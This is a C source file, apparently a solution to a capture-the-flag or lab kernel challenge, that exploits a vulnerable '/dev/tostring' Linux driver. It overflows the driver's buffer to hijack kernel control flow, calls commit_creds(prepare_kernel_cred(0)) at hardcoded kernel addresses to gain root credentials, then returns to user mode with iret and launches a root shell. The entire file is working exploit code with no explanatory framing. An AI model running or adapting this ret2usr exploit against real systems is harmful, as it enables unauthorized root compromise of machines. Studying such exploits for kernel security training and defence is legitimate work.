#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>

void *user_eip;
uint32_t user_cs;
uint32_t user_eflags;
uint32_t user_esp;
uint32_t user_ss;

void get_shell()
{
    execl("/bin/sh", "sh", NULL);
}

void save_status()
{
    __asm__("mov user_cs, cs;"
            "pushf;" 
            "pop user_eflags;"
            "mov user_esp, esp;"
            "mov user_ss, ss;");
    user_eip = &get_shell;
}

/* 
 * int commit_creds(struct cred *new)
 * struct cred* prepare_kernel_cred(struct task_struct* daemon)
 * */
#define KERNCALL __attribute__((regparm(3)))
void *(*prepare_kernel_cred)(void *) KERNCALL = (void *)0xC10711F0;
void (*commit_creds)(void *) KERNCALL = (void *)0xC1070E80;

void payload()
{
    commit_creds(prepare_kernel_cred(0));
    __asm__("push user_ss;"
            "push user_esp;"
            "push user_eflags;"
            "push user_cs;"
            "push user_eip;"
            "iret;");
}

int main()
{
    char pad[] = "AAAAAAAA";
    char eip[4];
    char c;
    save_status();
    int fd = open("/dev/tostring", O_RDWR);
    for (int i = 0; i < 0x40; i++)
        write(fd, pad, 8);
    *((void **)(eip)) = &payload;
	write(fd, eip, sizeof(eip));

    /* trigger exploit */
    read(fd, &c, 1);
    return 0;
}
